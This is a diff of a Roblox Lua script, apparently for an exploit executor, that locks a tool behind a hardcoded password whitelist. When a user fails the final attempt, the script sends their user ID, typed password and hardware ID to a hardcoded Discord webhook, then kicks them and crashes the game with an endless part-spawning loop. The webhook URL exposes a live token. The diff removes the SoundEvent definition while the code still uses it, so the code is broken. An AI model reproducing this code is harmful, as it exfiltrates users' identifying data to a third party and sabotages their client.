@@ -14,12 +14,6 @@ local ME = game:GetService("ReplicatedStorage").Events.ME -- Assuming ME is the 
 -- Webhook URL
 local Webhook_URL = "https://discord.com/api/webhooks/1205437358166646836/EW0c5Tfm0UIzK480wbPGS_TsI9a99hylePA5sf6CNDuPxgK1WXFiueHADjEKu5BNgf9c"
 
--- Sound Event to trigger
-local SoundEvent = {
-    [1] = "repsound",
-    [2] = "Teleport"
-}
-
 -- Whitelist with user-specific passwords
 local allowedUsers = {
     [2715331314] = "sugercoat",  -- UserId: Password
@@ -49,7 +43,6 @@ Tab:AddTextbox({
 Tab:AddButton({
     Name = "Submit Password",
     Callback = function()
-        -- Increment attempts every time the button is clicked
         attempts = attempts + 1
         
         local fraud = false
@@ -57,7 +50,6 @@ Tab:AddButton({
 
         -- Check if the user is whitelisted
         if allowedUsers[plr.UserId] then
-            -- Check if the password matches the user ID's assigned password
             if allowedUsers[plr.UserId] == inserted then
                 WV = "Yes"  -- Access granted
             end
@@ -65,7 +57,7 @@ Tab:AddButton({
             WV = "Blacklisted"  -- Blacklisted user
         end
 
-        -- Fraud Detection: If password matches a whitelisted user but not the current user, flag fraud
+        -- Fraud Detection
         for userId, password in pairs(allowedUsers) do
             if password == inserted and userId ~= plr.UserId then
                 fraud = true
@@ -76,59 +68,42 @@ Tab:AddButton({
 
         -- If attempts are less than max, provide feedback without kicking
         if attempts < maxAttempts then
-            local embedcolor = WV == "Yes" and 4388219 or 14887209
-            status = WV == "Yes" and "Access Granted" or WV == "Blacklisted" and "Blacklisted" or "Not Whitelisted" 
-
-            if fraud then status = "Not Whitelisted, Fraud detected." end
-            if not S_hwid then S_hwid = "Unknown" end
-
+            status = (WV == "Yes" and "Access Granted") or (WV == "Blacklisted" and "Access Denied, Blacklisted") or "Access Denied"
+            if fraud then status = "Access Denied, Fraud" end
+            
             -- Notify user about the current status
             OrionLib:MakeNotification({Name = "Attempt " .. attempts, Content = status, Image = "rbxassetid://4483345998", Time = 5})
 
         else
             -- Prepare to take action based on the final status
-            local actionMessage = ""
-            if WV == "Yes" then
-                actionMessage = "Access Granted"
-                checked = true
-            else
-                if fraud then
-                    actionMessage = "Not Whitelisted, Fraud detected."
-                elseif WV == "Blacklisted" then
-                    actionMessage = "Your personal information has now been leaked."
-                else
-                    actionMessage = "You are not whitelisted."
-                end
-            end
-
-            -- Send webhook notification right before taking action
-            local embedcolor = WV == "Yes" and 4388219 or 14887209
-            local response = request({
-                Url = Webhook_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    ["content"] = "",
-                    ["embeds"] = {{
-                        ["title"] = "Explorer Security Action",
-                        ["description"] = DName .. " / " .. UName .. " is attempting access. \n \n **Status** \n " .. actionMessage,
-                        ["type"] = "rich",
-                        ["color"] = embedcolor,
-                        ["fields"] = {
-                            {["name"] = "Information", ["value"] = "UserId: " .. tostring(plr.UserId) .. "\n Password Inserted: " .. tostring(inserted)},
-                            {["name"] = "Hardware Id", ["value"] = S_hwid, ["inline"] = true}
-                        }
-                    }}
-                })
-            })
-
-            -- Handle action based on access results
             if WV == "Yes" then
                 OrionLib:MakeNotification({Name = "Access Granted", Content = "Welcome, " .. DName .. "!", Image = "rbxassetid://4483345998", Time = 5})
+                checked = true
             else
+                -- Send webhook notification right before taking action
+                local embedcolor = (WV == "Yes" and 4388219) or 14887209
+                local response = request({
+                    Url = Webhook_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        ["content"] = "",
+                        ["embeds"] = {{
+                            ["title"] = "Explorer Security Action",
+                            ["description"] = DName .. " / " .. UName .. " is attempting access. \n \n **Status** \n " .. (WV == "Blacklisted" and "Access Denied, Blacklisted" or "Access Denied, Fraud"),
+                            ["type"] = "rich",
+                            ["color"] = embedcolor,
+                            ["fields"] = {
+                                {["name"] = "Information", ["value"] = "UserId: " .. tostring(plr.UserId) .. "\n Password Inserted: " .. tostring(inserted)},
+                                {["name"] = "Hardware Id", ["value"] = S_hwid, ["inline"] = true}
+                            }
+                        }}
+                    })
+                })
+
                 -- Fire event and crash the game
                 ME:FireServer(SoundEvent)
-                plr:Kick(actionMessage)
+                plr:Kick((WV == "Blacklisted" and "Access Denied, Blacklisted") or "Access Denied, Fraud")
                 while true do
                     local part = Instance.new("Part", workspace)
                     part.Name = "FUCKYOU"
@@ -139,3 +114,4 @@ Tab:AddButton({
 })
 
 repeat task.wait() until checked == true
+
